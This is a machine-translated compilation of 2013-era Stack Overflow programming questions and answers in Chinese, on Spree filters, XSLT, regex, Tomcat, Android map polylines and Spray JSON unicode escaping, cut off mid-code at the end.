注意`.`表示 cookie 域是站点范围的前导。这将确保可以从所有子域访问 cookie。以下是有关 cookie 域如何工作的更多[信息](https://stackoverflow.com/a/1063760/1592648)。您应该始终设置此配置选项，因为它默认为空，因此将使用默认 cookie 设置，这在大多数设置中不是开发人员想要的。

# ruby-on-rails - 属性和变体的大礼包搜索过滤器

> ID：14853046
> 
> 赞同：9
> 
> 时间：2013-02-13T11:58:12.100
> 
> 标签：ruby-on-rails, spree

我正在运行 Spree 1.3.1，并且正在尝试自定义分类显示页面。

我希望它返回当前分类单元中包含的产品，最终按属性或选项值过滤。

例如，假设我正在查看内衣系列的分类。我想通过提供一定的尺寸（option_type）来过滤显示的产品。在这种情况下，我应该只列出具有要求尺寸的变体的产品。

我还希望能够通过“适合”属性过滤产品。通过滑动配合过滤，我应该能够仅列出当前分类单元内具有所需属性的产品。

这是 Taxon 控制器的显示操作：

```
Spree::TaxonsController.class_eval do

    def show
      @taxon = Spree::Taxon.find_by_permalink!(params[:id])
      return unless @taxon

      @searcher = Spree::Config.searcher_class.new(params)
      @searcher.current_user = try_spree_current_user
      @searcher.current_currency = current_currency
      @products = @searcher.retrieve_products

      respond_with(@taxon)
    end

end 
```

我应该如何修改它以满足我的需要？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-17T15:03:08.373

我部分解决了这个问题。

我发现我需要让控制器保持原样，魔法是在我添加了这个新产品过滤器的 lib/spree/product_filters.rb 文件中完成的：

```
 if Spree::Property.table_exists?
    Spree::Product.add_search_scope :fit_any do |*opts|
      conds = opts.map {|o| ProductFilters.fit_filter[:conds][o]}.reject {|c| c.nil?}
      scope = conds.shift
      conds.each do |new_scope|
        scope = scope.or(new_scope)
      end
      Spree::Product.with_property("fit").where(scope)
    end

    def ProductFilters.fit_filter
      fit_property = Spree::Property.find_by_name("fit")
      fits = Spree::ProductProperty.where(:property_id => fit_property).pluck(:value).uniq
      pp = Spree::ProductProperty.arel_table
      conds = Hash[*fits.map { |b| [b, pp[:value].eq(b)] }.flatten]
      { :name   => "Fits",
        :scope  => :fit_any,
        :conds  => conds,
        :labels => (fits.sort).map { |k| [k, k] }
      }
    end
  end 
```

然后我将新过滤器添加到分类模型装饰器中：

```
Spree::Taxon.class_eval do

  def applicable_filters
    fs = []
    fs << Spree::Core::ProductFilters.fit_filter if Spree::Core::ProductFilters.respond_to?(:fit_filter)
    fs
  end  

end 
```

我仍然没有找到如何为具有特定选项值的变体创建过滤器。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-12T12:36:57.133

您谈论对数值进行过滤，我已经为选项范围编写了一个过滤器：

```
def ProductFilters.ov_range_test(range1, range2)
  ov = Arel::Table.new("spree_option_values")
  cast = Arel::Nodes::NamedFunction.new "CAST", [ ov[:presentation].as("integer")]
  comparaisons = cast.in(range1..range2)
  comparaisons
end

Spree::Product.add_search_scope :screenSize_range_any do |*opts|
  conds = opts.map {|o| Spree::ProductFilters.screenSize_filter[:conds][o]}.reject {|c| c.nil?}
  scope = conds.shift
  conds.each do |new_scope|
    scope = scope.or(new_scope)
  end
  option_values=Spree::OptionValue.where(scope).joins(:option_type).where(OptionType.table_name => {:name => "tailleEcran"}).pluck("#{OptionValue.table_name}.id")
  Spree::Product.where("#{Product.table_name}.id in (select product_id from #{Variant.table_name} v left join spree_option_values_variants ov on ov.variant_id = v.id where ov.option_value_id in (?))", option_values)
end

def ProductFilters.screenSize_filter
  conds = [ [ "20p ou moins",ov_range_test(0,20)],
  [ "20p - 30p",ov_range_test(20,30)],
  [ "30p - 40p" ,ov_range_test(30,40)],
  [ "40p ou plus",ov_range_test(40,190)]]
  { :name   => "taille",
    :scope  => :screenSize_range_any,
    :options => :tailleEcran,
    :conds  => Hash[*conds.flatten],
    :labels => conds.map {|k,v| [k,k]}
  }
end 
```

对于离散的特定值，您也可以看到这个： [https ://gist.github.com/Ranger-X/2511088](https://gist.github.com/Ranger-X/2511088)

# c# - 如何进入 MonoDevelop 中的第二个 C# 委托？

> ID：14853047
> 
> 赞同：0
> 
> 时间：2013-02-13T11:58:13.323
> 
> 标签：c#, debugging, delegates

假设有一段代码定义了 C# 委托：

```
public delegate void RezScript(IClientAPI remoteClient, InventoryItemBase item, 
                               UUID transactionID, uint localID); 
```

还有一个委托对象被定义和调用：

```
RezScript rezScriptHandler = OnRezScript;
...
rezScriptHandler += RelayRezScript;
...
if (rezScriptHandler != null) {
  rezScriptHandler(this, item, rezScriptx.InventoryBlock.TransactionID, 
                   rezScriptx.UpdateBlock.ObjectLocalID);
} 
```

如何单步执行对 MonoDevelop 调试器的调用`OnRezScript`和调用？`RelayRezScript`跳过将跳过所有委托，进入第一次调用的步骤，并在调用委托后返回到下一行。如何逐步遍历所有代表？

PS我当然可以重写代码以使用`GetInvocationList()`并在for循环中分别调用每个委托，但重点是在能够调试它的同时保持良好的语法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-17T10:20:35.827

到目前为止，我只发现了一种方法——在每个添加委托的函数的入口处设置一个断点。

# xslt - 如何使用xslt将第二个位置的节点添加到根节点

> ID：14853053
> 
> 赞同：1
> 
> 时间：2013-02-13T11:58:30.123
> 
> 标签：xslt

我有一个带有动态根元素（不是静态名称）和该根元素下的一些子元素的 xml 树。现在我想用 xslt 脚本在第二个位置向孩子添加一个元素。我该怎么做？

示例：xml：

```
<root>
  <element1>
    <element1a>
      ..
    </element1a>
  </element1>
  <element2 name="exampleName">This is text.</element2>
</root> 
```

应转换为

```
<root>
  <element1>
    <element1a>
      ..
    </element1a>
  </element1>
  <someNewElement>1234</someNewElement>
  <element2 name="exampleName">This is text.</element2>
</root> 
```

到目前为止，我得到的是以下内容。但是使用该解决方案，节点仅添加在第一个位置。我需要它在第二个位置。

```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
version="2.0">

<xsl:template match="/">
    <xsl:apply-templates select="/*"/>
</xsl:template>

<xsl:template match="/*">
    <xsl:copy>
        <xsl:element name="newElement">4711</xsl:element>
        <xsl:apply-templates select="node() | @*"/>
    </xsl:copy>
</xsl:template>   

<xsl:template match="node() | @*">
    <xsl:copy>
        <xsl:apply-templates select="node() | @*"/>
    </xsl:copy>        
</xsl:template>

</xsl:stylesheet> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:05:02.773

```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="2.0">

  <xsl:template match="/*/*[1]">
    <xsl:next-match />
    <xsl:element name="newElement">4711</xsl:element>
  </xsl:template>   

  <xsl:template match="node() | @*">
    <xsl:copy>
      <xsl:apply-templates select="node() | @*"/>
    </xsl:copy>        
  </xsl:template>

</xsl:stylesheet> 
```

这定义了一个与文档元素的第一个元素子元素匹配的模板，执行正常的标识模板处理（使用`next-match`），然后在其后面插入新元素。你也可以做

```
<xsl:template match="/*/*[2]">
  <xsl:element name="newElement">4711</xsl:element>
  <xsl:next-match />
</xsl:template> 
```

匹配第二个孩子并在它之前插入元素。`<root>`如果只有一个子元素，则两者之间的差异很明显，在这种情况下，`/*/*[1]`版本会插入 the`newElement`但`/*/*[2]`不会。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:08:03.033

这个怎么样：

```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="2.0">

  <xsl:template match="/*/*[1]">
    <xsl:call-template name="copy" />
    <newElement>4711</newElement>
  </xsl:template>

  <xsl:template match="node() | @*" name="copy">
    <xsl:copy>
      <xsl:apply-templates select="node() | @*"/>
    </xsl:copy>
  </xsl:template>

</xsl:stylesheet> 
```

在您的示例输入上运行时，这会产生：

```
<root>
  <element1>
    <element1a>
      ..
    </element1a>
  </element1>
  <newElement>4711</newElement>
  <element2 name="exampleName">This is text.</element2>
</root> 
```

如果您实际上使用的是 XSLT 2.0，您应该能够使用`<xsl:next-match />`而不是`<xsl:call-template name="copy" />`，并从另一个模板中删除该`name`属性。

# vb.net - 标签 vb.net 中的循环文件名

> ID：14853058
> 
> 赞同：-1
> 
> 时间：2013-02-13T11:58:44.533
> 
> 标签：vb.net, file, loops, directory

使用 vb.net，我如何遍历给定目录中的所有文件名，然后将它们显示在标签中？

```
Dim PATH_DIR_1 As String
Dim INTERVAL_DIR_1 As String

PATH_DIR_1 = Registry.GetValue("HKEY_CLASSES_ROOT\SOFTWARE\Sidewinder", "DIR_1", "")

INTERVAL_DIR_1 = Registry.GetValue("HKEY_CLASSES_ROOT\SOFTWARE\Sidewinder", "INT_DIR_1", "")

For Each foundFile As String In (PATH_DIR_1)
    Label1.Text = (foundFile)
Next 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:14:01.907

`System.IO`有很多使用 Windows 文件系统的类，这里有一个你想要做的例子：

```
Imports System.IO

......

Sub DisplayFileList(ByRef theLabel As Label, ByVal thePath As String)

    Dim di As New DirectoryInfo(thePath)

    For Each fi As FileInfo In di.GetFiles()

        theLabel.Text &= fi.FullName 'or just fi.Name, FullName is the complete path

    Next

End Sub 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T14:14:49.990

或者

```
Imports System.IO
...
For Each filePathAsString In Directory.EnumerateFiles("DirPath")
   Label1.Text = filePathAsString
Next 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T12:09:53.607

您可以通过以下方式获取目录的文件名列表：

```
Dim sFiles() as String = System.IO.Directory.GetFiles(sDirectoryPath) 
```

`Label`然后以你想要的方式添加它：

```
For Each s As String in sFiles
    Label1.Text &= s & "/"
Next 
```

# java - 如何消除tomcat服务器的端口号

> ID：14853064
> 
> 赞同：1
> 
> 时间：2013-02-13T11:59:02.373
> 
> 标签：java, tomcat, axis2

我有一个专用服务器，并且上面安装了 tomcat。但是访问tomcat的唯一方法是在URL中给出端口号。例如：[http](http://server.mydomain.com:8080) ://server.mydomain.com:8080 将我​​带到 tomcat 服务器。如何从 URL 中删除端口号？？？？

只要我在使用它，这很好，但现在我已经生成了一个 SOAP 服务，并且我已经将它部署在了 axis2 上。现在访问我的服务的 URL 就像 [http://server.mydomain.com:8080/axis2/services/MyService?wsdl](http://server.mydomain.com:8080/axis2/services/MyService?wsdl) 显示端口号，那么如何删除这个端口号？

或者有没有其他方法可以在不显示端口号的情况下访问我的服务？谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T12:03:22.697

3 个词：**Apache 反向代理**

我讨厌处理这样的 Java/Tomcat 特性，所以我要做的是通过 Apache 进行反向代理，为 Tomcat 提供一个不错/正常的端口 80 URL。[我在 Server Fault](https://serverfault.com/questions/473130/securing-apache-solr-in-production/473307#473307)上对我的方法有详细的回答。

这样我的 Tomcat 设置是健全和干净的，而 Apache 让我在前端可访问性和控制方面更加灵活。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-13T12:00:22.200

不显示端口号意味着它必须在端口 80 (http) 或 443 (https) 上运行。为此，您需要修改您的 tomcat 配置。我在互联网上找到了这个，希望它有帮助：[http ://www.mkyong.com/tomcat/how-to-change-tomcat-default-port/](http://www.mkyong.com/tomcat/how-to-change-tomcat-default-port/)

# asp.net - chrome自动将焦点设置在文本框上

> ID：14853069
> 
> 赞同：0
> 
> 时间：2013-02-13T11:59:14.913
> 
> 标签：asp.net, html, browser

我有一个 aspx 表单，其中包含几个文本框、下拉列表和复选框。我没有在任何控件上设置默认焦点。当我在 IE 中打开它时，它工作正常。但是当页面在 chrome 中打开时，它会将焦点设置在一个文本框上，该文本框不是 DOM 的第一个元素。当页面在 FireFox 中打开时，它会将焦点设置在 DOM 中的第一个文本框上。

我不想专注于任何控件，我该如何解决这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:21:35.657

你能试试`document.getElementById('yourElement').blur();`吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:29:44.653

看看这些链接： http: [//msdn.microsoft.com/en-us/library/ms178231](http://msdn.microsoft.com/en-us/library/ms178231(v=vs.100).aspx) (v=vs.100).aspx 或 [http://msdn.microsoft.com/en-us/library/ms178232 (v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/ms178232(v=vs.100).aspx)

也许它可以帮助你。

尝试在 aspx 中设置默认焦点，如下所示：

```
<form id="form1" runat="server" defaultfocus="TextBox1" >
  <div>
    <asp:TextBox ID="TextBox1" runat="server"></asp:TextBox>
    <br />
    <asp:Button ID="Button1" runat="server" Text="Button" />
    <br />
  </div>
</form> 
```

发布您的代码以获取更多信息。

回复：我认为您必须至少关注页面上的一个控件。您可以将虚拟控件设置为输入，并将其在 css 中的不透明度设置为 0，并在其上设置默认焦点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T14:14:35.150

您可以添加 autofocus = false;

```
<input type="text" name="second" id="second" "autofocus = false" /> 
```

# regex - 正则表达式帮助，连续只有一个连字符？

> ID：14853075
> 
> 赞同：1
> 
> 时间：2013-02-13T11:59:36.803
> 
> 标签：regex

我想接受`0-9` `,`并`-`

所以我有：

```
[0-9-,]+ 
```

但是我只希望`-`连续有一个，所以你不能拥有`--`. 我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:00:34.087

使用[前瞻断言](http://www.regular-expressions.info/lookaround.html)：

```
(?!.*--)[0-9,-]+ 
```

此外，您可能需要使用[锚点](http://www.regular-expressions.info/anchors.html)来确保匹配整个字符串：

```
^(?!.*--)[0-9,-]+$ 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-13T12:22:33.333

我认为需要一个是这样的：

```
^\d+(-\d+)?(,\d+(-\d+)?)*$ 
```

这是做什么的：

`\d+`任何整数（一位或多位）

`(-\d+)?`可选部分匹配 a`-`后跟一个整数

`(,\d+(-\d+)?)*`a 出现零次或多次，`,`然后是上述模式的组合。

**注意：**添加所需的转义`\`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T12:24:58.497

这个可以吗 ？

```
^[0-9,]*-?[0-9,]*$ 
```

刚刚用 grep 做了一个小测试：

```
kent$  echo "1-234-
1234-
3-24442-34
12341234"|grep -E '^[0-9,]*-?[0-9,]*$'
1234-
12341234 
```

# cordova - Phonegap 构建谷歌分析插件

> ID：14853076
> 
> 赞同：0
> 
> 时间：2013-02-13T11:59:38.680
> 
> 标签：cordova

我正在使用 phonegap 构建测试谷歌分析插件。

我看到它在谷歌分析上注册了索引页面，但是如果我尝试跟踪一个子页面（我服务器上的外部页面），那么当我在应用程序中加载它时该页面被计算 5 次？

我有以下代码：

```
 var gaPlugin;

      function onBodyLoad()
            {     

             document.addEventListener("deviceready", onDeviceReady, false);
            }

            function onDeviceReady()
            {
         document.addEventListener("resume",onResume,false);

        gaPlugin = window.plugins.gaPlugin;
        gaPlugin.init(successHandler, errorHandler, "UA-xxxxx-1", 10);

        gaPlugin.trackPage( successHandler, errorHandler, "index.html");

            }

        function onResume(){
            gaPlugin.trackPage( successHandler, errorHandler, "index.html");

          }
         function PageButtonClicked() {
    //gaPlugin.trackPage( successHandler, errorHandler, "http://www.mydomain.se/folder/news/news1.asp");
    gaPlugin.trackPage( nativePluginResultHandler, nativePluginErrorHandler, "http://www.mydomain.se/folder/news/news1.asp");
                }

        function successHandler (result) {
        alert('successHandler - '+result);

                }

        function errorHandler (error) {
        alert('errorHandler - '+error);

                }

        function goingAway() {
        gaPlugin.exit(successHandler, errorHandler);

                }

<body onLoad="onBodyLoad();" onunload="goingAway();"> 
```

1.  在 PageButtonClicked 函数中，我应该使用女巫吗？nativePluginResultHandler 是调用 phonegap.js 文件中的某个函数还是？我应该使用succesHandler吗？

2.  goingAway 函数真的在做什么吗？我需要吗？

3.  也许我应该只计算索引页？

4.  它看起来应该吗？或者我哪里出错了？

任何输入表示赞赏，谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-23T00:41:01.650

你想在这里跟踪什么，看起来像你在外部网页上调用 trackPage ？您是在导航到这个还是实际发生了什么？

无论如何：据我了解，如果您引用 nativePluginResultHandler 您还必须将它们声明为函数（不是 100% 肯定），但使用成功函数应该具有相同的结果。我所做的基本上是：

```
gaTrackPageView: function(page) {
    // Call this function with the hash when the page changes
    var index = "index.html";
    var trackpage = index.concat(page);
    console.log('Tracking ' + trackpage);
    gaPlugin.trackPage(gaSuccess, gaFail, trackpage);
},

    gaSuccess: function() {
    // If the first connection is successful, track index page
    console.log('Successfully connected to Google Analytics');
},

gaFail: function() {
    // Generic failure function
    console.warn("Failed to connect to Google Analytics");
}, 
```

这是一个 Javascript SPA，所以我用哈希调用 gaTrackPageView 函数。

[我自己刚刚经历了这个，如果你愿意，你可以在http://xc.ms](http://xc.ms)查看我的博客文章，其中包含我如何设置它的完整代码 - 我将能够提供帮助如果您共享更多代码会更好，因为我不是 100% 确定您要跟踪的内容:)

//P

# c# - 在托管 Direct3D 9 中使用多个纹理进行渲染

> ID：14853077
> 
> 赞同：1
> 
> 时间：2013-02-13T11:59:40.287
> 
> 标签：c#, 3d, directx, textures, texture-mapping

我是相当新的 Direct3D 并且几天来一直在寻找解决我的问题的方法。我见过的大多数覆盖纹理的教程只使用一种纹理。对于我的程序，我有多个纹理映射到构成我的网格的特定顶点集合。

我的问题是如何将多个纹理加载到我的场景中？以及如何将一组顶点映射到一个纹理？

例如，如果我有一个汽车网格并且我有一组纹理，例如：

```
 Tyres.dds
 Body.dds
 Cabin.dds 
```

给定这辆车，我如何将构成轮胎的顶点映射到 tyres.dds 纹理，将车身映射到 body.dds 以及将舱室映射到 Cabin.dds。所有这些纹理不仅要渲染一个。

任何帮助将不胜感激，谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-14T11:21:54.897

通常这是通过子网格完成的。这意味着网格由几个部分组成，这些部分表示为例如三角形列表。每个子网格都分配有一种材质。可以根据需要定义此材料。它可能包括漫反射颜色、粗糙度和纹理。

所以在渲染网格的时候，你基本上会迭代每个子网格，将材质参数发送到显卡，然后绘制。

DirectX 10 中另一个可能的解决方案是通过`TextureIndex`变量扩展顶点声明。或者您可以使用 3d 纹理坐标。这样，您可以将所有纹理作为纹理数组发送到显卡，并通过一次绘制调用绘制网格。但是，DirectX 9 不支持纹理数组。因此您可以坚持方法 1 或尝试模拟纹理数组。

# css - 使用“特别”字体的样式而不是 html 或 css 字体样式（谷歌字体）

> ID：14853078
> 
> 赞同：0
> 
> 时间：2013-02-13T11:59:40.500
> 
> 标签：css, xhtml, webfonts

我遇到了这个烦人的问题，我似乎无法找到一种方法来使用 ACTUAL 字体系列中的特定样式，而不是使用 css 或 html 样式。

就我而言，我正在链接到 html Google 的 Webfont: Lato。现在我只需要*Normal400*和*Bold700Italics*样式。

自然，当您在 googlefonts 上选择字体时，它会自动生成代码。我将两个代码复制并粘贴到我的 html 文档中，另一个在 css 中。但我不知道如何使用字体*lato的**Normal400*和*Bold700Italics*样式。

 *我所得到的与使用字体的“斜体”和“粗体”样式相同，而不是在 html 中使用强调或粗体标签来设置样式。字体美学的结果存在巨大差异。

有没有办法做到这一点？如果是这样，我是否必须在我的 css 中使用 @fontface 规则，或者是否有其他方法可以绕过它，因为我有时害怕使用此规则。

我到处寻找，甚至在谷歌的论坛上，他们都给出了相同的答案：“使用 css 或 html 进行字体样式设置。”

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:05:58.747

字体链接：

```
<link href='http://fonts.googleapis.com/css?family=Lato:400,700italic' rel='stylesheet' type='text/css'> 
```

在你的 CSS 中声明字体：

```
.Lato-italic-700 {
    font-family: 'Lato', arial, sans-serif;
    font-style: italic;
    font-weight: 700;
} 
```

将类放在要显示的元素上：

```
<p class="Lato-italic-700">This is Bold 700 Italic text</p> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T16:48:55.033

目前尚不清楚问题是什么。但基本上，当您`link`按照 Google 的建议使用元素以常规和粗斜体字体使用 Lato 时`font-family: Lato`，如果其字体粗细和字体样式正常，则您声明的任何文本都将出现在 Lato Regular 中 a) b) 在 Lato Bold Italic 中，如果它同时具有`font-weight: bold`并`font-style: italic`应用于它 c) 在其他情况下，可能的其他内容，例如综合加粗的 Lato Regular，如果字体粗细已设置为粗体但字体样式是正常的。

例如，以下代码首先生成 Lato Regular，然后生成 Lato Bold Italic。您可以（通常应该）使用其他标记或 CSS；这只是一个简单的例子：

```
<!doctype html>
<link href='http://fonts.googleapis.com/css?family=Lato:400,700italic' 
      rel='stylesheet' type='text/css'>
<style>
body { font-family: Lato; }
</style>
Hello<br>
<i><b>Hello</b></i> 
```

如果问题仍然存在，请发布您的 HTML 和 CSS 代码，并解释您所说的“字体样式不是 html 或 css 字体样式”是什么意思，以及如何从视觉外观上分辨出差异。*

# c++ - 使用“包含包装器”是否被认为是不好的做法/表明设计不好？

> ID：14853079
> 
> 赞同：0
> 
> 时间：2013-02-13T11:59:50.530
> 
> 标签：c++, include

考虑一种情况，您的任务是为标准库容器编写一个简单的漂亮打印工具。在标题`pretty_print.hpp`中声明以下函数：

```
// In pretty_print.hpp
template<typename T>
void pretty_print(std::ostream& os, std::vector<T> const& vec);

template<typename T>
void pretty_print(std::ostream& os, std::set<T> const& set);

template<typename T, typename U>
void pretty_print(std::ostream& os, std::map<T, U> const& map);

// etc. 
```

但是，由于无法前向声明容器，因此您必须`#include`使用每个容器标头。结果，包含`pretty_print.hpp`到库的其他部分会（可能？）导致大量代码膨胀。因此，为了避免将这些依赖项引入其他编译单元，您制作了一堆文件（我称它们为“头文件包装器”，因为我找不到任何其他术语）`print_vector.hpp`，`print_set.hpp`它们都有一个类似的布局：

```
// In print_vector.hpp
#include <vector>
template<typename T>
void pretty_print(std::ostream& os, std::vector<T> const& vec);

// In print_set.hpp
#include <set>
template<typename T>
void pretty_print(std::ostream& os, std::set<T> const& set);

// you get the point 
```

因此，当您希望能够`pretty_print`使用向量时，您会`#include print_vector.hpp`并且它只会引入`<vector>`当前编译单元而不是`<set>`，`<map>`或您可能不需要的任何其他标头。请注意，我正在使用`pretty_print`作为示例（我确信有很多更好的方法可以漂亮地打印容器），但您可能还有其他原因想要这样做（例如，在include之前在其中创建`lean_windows.h`标题“包装器” ）。`#define WIN32_LEAN_AND_MEAN``windows.h`

我看不出这种方法有什么问题，因为这意味着您避免了在编译单元中引入一堆您可能不需要/不需要的头文件而导致的潜在膨胀。尽管如此，它仍然感觉“错误”，因为其他人可能看不到您的“包含包装器”实际上包含您想要的标头，并且似乎玷污了包含标准库标头的“神圣性”（`#include <string>`是惯用的，而`#include "string_wrapper.hpp"`不是）。

这是否被认为是不好的做法\表明设计不好？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:03:16.873

一些图书馆处理这类事情的一种方式是让用户决定。制作类似`print/vector.hpp`and的文件`print/set.hpp`，也制作一个类似的文件`print/all.hpp`（或者只是`print.hpp`，尽管这可能会鼓励坏习惯）。最后一个文件只是#includes所有单独的文件，所以想要“方便”的人可以拥有它，而那些想要精简和平均编译的人也可以拥有它。

与上述类似的一个常见示例是 Boost 的智能指针库： http: [//www.boost.org/doc/libs/release/boost/smart_ptr.hpp](http://www.boost.org/doc/libs/release/boost/smart_ptr.hpp)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:05:17.317

我宁愿问，是否真的有必要。你正在慢慢地转向一个类一个标题的方向，这会将你的#include 部分变成一个痛苦的混乱。

如果您想确定不会将标识符与另一个标识符混淆，只需使用命名空间即可。

```
namespace PrettyPrint
{
    template<typename T>
    void pretty_print(std::ostream& os, std::vector<T> const& vec);

    template<typename T>
    void pretty_print(std::ostream& os, std::set<T> const& set);

    template<typename T, typename U>
    void pretty_print(std::ostream& os, std::map<T, U> const& map);
} 
```

现在，这些函数得到保护，不会被其他函数弄错，并且您的代码保持安全和优雅。

我看到的唯一缺点是，包含长标头会使编译过程更长一些。但是，我认为，我们最多只讨论十分之一秒，所以如果你不是在处理像 old 386 这样的东西，那应该不是一个大问题（更不用说预编译的头文件，但老实说我做到了一次也没用过）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T12:35:21.013

您可以简单地尝试一个更通用的版本：

```
template<class T>
void print_element(std::ostream& os, T const& element)
{
  os << T;
}
template<class Key,class Value>
void print_element(std::ostream& os, std::pair<Key,Value> const& element)
{
  os << '(' << element->first << ',' << element->second << ')';
}

template<typename Container>
void pretty_print(std::ostream& os, Container const& c)
{
   for (auto i: c)
   {
     // print some stuff
     print_element(os, *i);
     // print other stuff
   }
} 
```

# android - 如何从地图中删除所有折线

> ID：14853084
> 
> 赞同：54
> 
> 时间：2013-02-13T12:00:12.107
> 
> 标签：android, google-maps, google-maps-android-api-2

下列的

[如何在两个标记之间绘制路径](https://stackoverflow.com/questions/14702621/answer-draw-path-between-two-points-using-google-maps-android-api-v2)

我不得不在两个标记之间添加很多折线，以形成一条路径。

其中一个标记是可拖动的，可以说源是可拖动的。

因此，当用户开始拖动标记时，必须擦除先前绘制的路径，并且必须绘制新源和目标之间的新路径。

我可以画出新的路径，但我怎样才能删除以前的路径？

这是绘制路径的方式：

```
 for (int z = 0; z < list.size() - 1; z++) {
        LatLng src = list.get(z);
        LatLng dest = list.get(z + 1);
        Polyline line = map.addPolyline(new PolylineOptions()
                .add(new LatLng(src.latitude, src.longitude),
                        new LatLng(dest.latitude, dest.longitude))
                .width(2).color(Color.RED).geodesic(true));
    } 
```

我能得到的一种解决方案是

> map.clear();

清除所有折线、标记等，然后再次添加标记，然后绘制路径。

但是一旦我开始拖动，标记就会被清除，因此在地图上不可见:(

谢谢你

* * *

## 回答 #1

> 赞同：139
> 
> 时间：2013-02-13T19:35:04.837

在将折线添加到地图时跟踪它：

```
Polyline polyline = this.mMap.addPolyline(new PolylineOptions().....); 
```

然后当你想删除它时：

```
polyline.remove(); 
```

如果您有很多折线，只需将它们添加到列表中即可：

```
List<Polyline> polylines = new ArrayList<Polyline>();

for(....)
{
    polylines.add(this.mMap.addPolyline(new PolylineOptions()....));
} 
```

当你想删除时：

```
for(Polyline line : polylines)
{
    line.remove();
}

polylines.clear(); 
```

关键是保持对折线对象的引用并在每个对象上调用 .remove() 。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2014-11-17T16:09:39.147

我知道这是一个非常古老的问题，但我注意到这是非常普遍的需求。我找到了另一种方法，我想分享它。

这是基本思想：

```
Polyline polylineFinal;
PolylineOptions polylineOptions;

loop {

    polylineOptions.add( new LatLng( latitude, longitude ) );

}

polylineOptions.width(2);
polylineOptions.color(Color.RED);
polylineOptions.geodesic(true);

polylineFinal = map.addPolyline (polylineOptions); 
```

Map 的“addPolyline”方法返回一条包含所有点的折线。当我需要移除这些点时，我会调用 polylineFinal 的“移除”方法。

```
polylineFinal.remove(); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2020-05-16T01:45:26.887

# 更新

如果您想从地图中删除所有标记、折线、多边形、叠加层等，请使用

```
mMap.clear(); //it will remove all additional objects from map 
```

如果您只想删除所有或单个折线、多边形、标记等，请参阅上面的[@DiskDev 答案](https://stackoverflow.com/posts/14861563/revisions)。在这种情况下，您必须跟踪添加到地图的每个附加对象

# scala - 无法将 unicode 符号转换为西里尔字母

> ID：14853087
> 
> 赞同：4
> 
> 时间：2013-02-13T12:00:18.807
> 
> 标签：scala, unicode, escaping, spray, spray-json

我有一堆文件保存在 Apache Lucene 中，其中一些名称是俄语，当我尝试将它们打印出来时，它看起来像这样`"\u0410\u0441\u043f\u0430\u0440"`，但不是西里尔符号。该项目在Scala中。我尝试使用 Apache Commons`unescapeJava`方法解决此问题，但没有帮助。还有其他选择吗？

**更新：** 项目是用 Spray 框架编写的，并像这样返回 json。

```
{
  "id" : 0,
  "name" : "\u0410\u0441\u043f\u0430\u0440"
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-13T14:46:08.913

我将尝试准确推断您在做什么。您正在使用 Spray，所以我推测您正在使用它的 json 库“spray-json”

所以我想你有一些实例`spray.json.JsObject`，并且你在问题中发布的是你在打印这个实例时得到的输出。您的 json 对象是正确的，该`name`字段的值没有嵌入转义，它实际上是转义为字符串的一些 unicode 字符。

请参阅此处的定义`printString`： [https ://github.com/spray/spray-json/blob/master/src/main/scala/spray/json/JsonPrinter.scala](https://github.com/spray/spray-json/blob/master/src/main/scala/spray/json/JsonPrinter.scala)

我还将假设当您尝试使用 时`unescapeJava`，您将其应用于`name`字段的值，创建一个新`spray.json.JsObject`实例，然后像以前一样打印该实例。鉴于您的 json 对象实际上没有任何转义，这绝对没有任何作用，然后在打印它时，打印机会像以前一样进行转义，然后您又回到了原点。

作为旁注，值得一提的是，json 规范并没有规定字符的编码方式：它们可以存储为文字值，也可以存储为 unicode 转义。例如，字符串`"abc"`可以描述为 just`"abc"`或 as `"\u0061\u0062\u0063"`。任何一种形式都是正确的。恰好 spray-json 的作者决定对所有非 ascii 字符使用后一种形式。

所以现在你问，我能做些什么来解决这个问题？您可以要求 spray-json 作者添加一个选项，让您指定您不希望任何 unicode 转义。**但我想你现在**想要一个解决方案。

最简单的做法是将对象转换为字符串（通过`JsValue.toString`or`JsValue.compactPrint`或`JsValue.prettyPrint`），**然后**将结果传递给`unescapeJava`. 至少这会让你回到你的西里尔原始字符。但这有点粗俗，实际上非常危险，因为某些字符在字符串文字中转义是不安全的。例如：`\n`将不转义为实际返回，并且`\u0022`将不转义为`"`. 您可以轻松查看它将如何破坏您的 json 文档。但至少它可以证实我的理论（请记住，我一直在假设你到底在做什么）。

现在进行适当的修复：您可以简单地扩展`JsonPrinter`并覆盖其`printString`方法以删除 unicode 转义。像这样的东西（未经测试）：

```
trait NoUnicodeEscJsonPrinter extends JsonPrinter {
